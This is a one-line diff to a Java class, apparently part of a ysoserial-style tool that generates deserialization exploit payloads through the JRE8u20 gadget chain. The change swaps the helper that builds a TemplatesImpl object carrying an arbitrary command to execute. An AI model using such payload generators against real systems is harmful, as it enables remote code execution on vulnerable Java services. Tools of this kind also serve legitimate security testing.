@@ -24,7 +24,7 @@ public class JRE8u20 implements CommandObjectPayload<Object>
 {
 
 	public static Object makeTemplates(String command) throws Exception {
-		Object templates = Gadgets.createTemplatesImpl(command);
+		Object templates = Gadgets.createTemplates4Cmd(command);
 		Reflections.setFieldValue(templates, "_auxClasses", null);
 		return templates;
 	}
